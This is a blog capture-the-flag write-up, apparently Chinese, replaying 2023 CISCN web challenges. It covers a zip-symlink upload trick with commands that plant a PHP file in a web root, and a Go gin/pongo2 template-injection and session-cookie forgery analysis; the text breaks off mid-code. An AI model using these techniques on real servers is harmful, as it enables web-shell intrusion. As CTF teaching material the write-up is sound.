<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Unzip#unzip+软连接getshell一个文件上传的口子 有一个upload.php文件 12345678910&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo &#x3D; finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($finfo, $_FILES[&quot;file&quot;]">
<meta property="og:type" content="article">
<meta property="og:title" content="2023CISCN国赛web浮现">
<meta property="og:url" content="https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="Unzip#unzip+软连接getshell一个文件上传的口子 有一个upload.php文件 12345678910&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo &#x3D; finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($finfo, $_FILES[&quot;file&quot;]">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250916171150885.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250916175249691.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917150851284.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917151138816.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917151231149.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917154633299.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917155050077.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917164411801.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917164622271.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917170409106.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917170505607.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917170913551.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250917173159730.png">
<meta property="article:published_time" content="2025-09-16T07:07:54.000Z">
<meta property="article:modified_time" content="2025-09-17T09:34:17.003Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="2023CISCN国赛">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/CISCN/image-20250916171150885.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>2023CISCN国赛web浮现</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	

<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/09/16/SSTI%E7%9A%84%E7%A7%AF%E7%B4%AF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/09/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&text=2023CISCN国赛web浮现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&title=2023CISCN国赛web浮现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&is_video=false&description=2023CISCN国赛web浮现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2023CISCN国赛web浮现&body=Check out this article: https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&title=2023CISCN国赛web浮现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&title=2023CISCN国赛web浮现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&title=2023CISCN国赛web浮现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&title=2023CISCN国赛web浮现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&name=2023CISCN国赛web浮现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/09/16/2023CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/&t=2023CISCN国赛web浮现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unzip"><span class="toc-number">1.</span> <span class="toc-text">Unzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E8%BD%AF%E8%BF%9E%E6%8E%A5getshell"><span class="toc-number">1.1.</span> <span class="toc-text">#unzip+软连接getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-session"><span class="toc-number">2.</span> <span class="toc-text">go_session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E7%9A%84%E7%94%9F%E6%88%90"><span class="toc-number">2.2.</span> <span class="toc-text">cookie的生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pongo2%E5%A6%82%E4%BD%95SSTI"><span class="toc-number">2.3.</span> <span class="toc-text">pongo2如何SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c-gin-Context%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">c *gin.Context的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">2.5.</span> <span class="toc-text">POC</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        2023CISCN国赛web浮现
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-09-16T07:07:54.000Z" class="dt-published" itemprop="datePublished">2025-09-16</time>
        
        (Updated: <time datetime="2025-09-17T09:34:17.003Z" class="dt-updated" itemprop="dateModified">2025-09-17</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E8%B5%9B%E9%A2%98wp/">赛题wp</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/2023CISCN%E5%9B%BD%E8%B5%9B/" rel="tag">2023CISCN国赛</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Unzip"><a href="#Unzip" class="headerlink" title="Unzip"></a>Unzip</h2><h3 id="unzip-软连接getshell"><a href="#unzip-软连接getshell" class="headerlink" title="#unzip+软连接getshell"></a>#unzip+软连接getshell</h3><p>一个文件上传的口子</p>
<p>有一个upload.php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this!</span></span><br></pre></td></tr></table></figure>

<p>需要传一个zip文件</p>
<p>unzip是一个Linux命令，用于解压缩由zip命令压缩的压缩包</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cxhfuujust/p/8193310.html">https://www.cnblogs.com/cxhfuujust/p/8193310.html</a></p>
<p>然后我们看看这段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>这里的话会将zip文件解压到&#x2F;tmp下，这意味着我们无法正常的访问我们上传的压缩包，这时候该咋打呀？</p>
<p>后面发现unzip可以用软连接。<strong>软连接就是可以将某个目录连接到另一个目录或文件下，类似于Windows中的快捷方式，那么我们以后对这个目录的任何操作，都会作用到另一个目录或者文件下。</strong></p>
<p>具体的命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s [源文件或目录] [目标文件或目录]</span><br><span class="line">举个例子</span><br><span class="line"><span class="built_in">ln</span> -s /bin/less /usr/local/bin/less</span><br><span class="line">在 /usr/local/bin/ 下创建一个符号链接 less，指向 /bin/less。</span><br></pre></td></tr></table></figure>

<p>为什么unzip能用软连接呢？这得看zip压缩命令</p>
<p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/zip">https://linux.die.net/man/1/zip</a></p>
<p><img src="/../image/achieve/202411/CISCN/image-20250916171150885.png" alt="image-20250916171150885"></p>
<p>如果在创建 ZIP 文件时使用了 <code>-y</code> 或 <code>--symlinks</code> 参数，<code>zip</code> 会将符号链接以符号链接的形式存储在压缩包中。</p>
<p>当使用 <code>unzip</code> 解压时，它会识别这些符号链接，并在目标系统上创建相应的符号链接，而不是将其解压为普通文件。</p>
<p>所以这里的做法就很明显了，我们先上创一个符号链接的压缩包创建一个软连接指向网站根目录<code>/var/www/html</code>，然后我们再上传一个带木马的zip文件，就可以在网站根目录访问到了</p>
<p>先创建软连接压缩包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/tmp# <span class="built_in">mkdir</span> <span class="built_in">test</span></span><br><span class="line">root@VM-16-12-ubuntu:/tmp# <span class="built_in">cd</span> <span class="built_in">test</span></span><br><span class="line">root@VM-16-12-ubuntu:/tmp/test# <span class="built_in">ln</span> -s /var/www/html <span class="built_in">link</span></span><br><span class="line">root@VM-16-12-ubuntu:/tmp/test# zip --symlinks link.zip <span class="built_in">link</span></span><br></pre></td></tr></table></figure>

<p>然后我们需要删除link并创建一个在link目录下的payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/tmp/test# <span class="built_in">mkdir</span> <span class="built_in">link</span></span><br><span class="line">root@VM-16-12-ubuntu:/tmp/test# <span class="built_in">cd</span> <span class="built_in">link</span></span><br><span class="line">root@VM-16-12-ubuntu:/tmp/test/link# <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> &gt; test.php</span><br><span class="line">root@VM-16-12-ubuntu:/tmp/test/link# <span class="built_in">cd</span> ../</span><br><span class="line">root@VM-16-12-ubuntu:/tmp/test# zip -r link1.zip ./*</span><br><span class="line">  adding: <span class="built_in">link</span>/ (stored 0%)</span><br><span class="line">  adding: <span class="built_in">link</span>/test.php (stored 0%)</span><br><span class="line">  adding: link.zip (stored 0%)</span><br></pre></td></tr></table></figure>

<p>然后将link.zip和link1.zip分别上传后访问test.php就能成功访问到了</p>
<p>后面换成一句话木马去打就行</p>
<p><img src="/../image/achieve/202411/CISCN/image-20250916175249691.png" alt="image-20250916175249691"></p>
<h2 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>main.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">	r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gin web框架，定义了三个路由<code>/</code>、<code>/admin</code>、<code>/flask</code></p>
<p>然后看看定义路由的文件route.go，逐个分析一下</p>
<p>首先就是导入的依赖</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;html&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>可以看到这里还导入了Go的模板引擎pongo2以及Cookie Sessions库</p>
<p>然后对session进行了操作</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br></pre></td></tr></table></figure>

<p>通过从环境变量中获取SESSION_KEY的值去设置session的key，<code>NewCookieStore</code> 是 Gorilla Sessions 库里的一个 <strong>构造函数</strong>，用来创建一个基于 <strong>Cookie 的会话存储</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取请求中的键为session-name的cookie作为session对象，获取错误则返回500并返回，如果值中的name为空的话就设置为guest并保存，但是最后的话都会返回200以及<code>Hello, guest</code>到页面</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">	xssWaf := html.EscapeString(name)</span><br><span class="line">	tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求session中的name需要为admin，否则报错返回</p>
<p>随后获取name参数，默认值为ssti，通过 <code>html.EscapeString</code> 转义name的输入避免xss漏洞，最后用pongo2渲染并输出，这里很明显能看到是拼接字符串的形式，说不定会存在ssti呢？</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将请求转发到本地Flask服务并返回响应体</p>
<p>上面的分析其实可以看出来，我们第一个要做的事情就是伪造cookie，但是这个go语言的cookie是怎么生成的呢？</p>
<h3 id="cookie的生成"><a href="#cookie的生成" class="headerlink" title="cookie的生成"></a>cookie的生成</h3><p>在github.com&#x2F;gorilla&#x2F;securecookie库中有一个Encode函数</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SecureCookie)</span></span> Encode(name <span class="type">string</span>, value <span class="keyword">interface</span>&#123;&#125;) (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> s.err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, s.err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> s.hashKey == <span class="literal">nil</span> &#123;</span><br><span class="line">		s.err = errHashKeyNotSet</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, s.err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	<span class="keyword">var</span> b []<span class="type">byte</span></span><br><span class="line">	<span class="comment">// 1. Serialize.</span></span><br><span class="line">	<span class="keyword">if</span> b, err = s.sz.Serialize(value); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, cookieError&#123;cause: err, typ: usageError&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 2. Encrypt (optional).</span></span><br><span class="line">	<span class="keyword">if</span> s.block != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> b, err = encrypt(s.block, b); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, cookieError&#123;cause: err, typ: usageError&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	b = encode(b)</span><br><span class="line">	<span class="comment">// 